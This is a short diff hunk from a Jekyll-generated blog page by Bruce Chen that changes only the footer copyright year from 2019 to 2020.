@@ -874,7 +871,7 @@ userB-&gt;message-&gt;sender | char *p_name | userC-&gt;name
   </ul>
 </div>
 
-<div class="page__footer-copyright">&copy; 2019 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+<div class="page__footer-copyright">&copy; 2020 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
 
       </footer>
     </div>
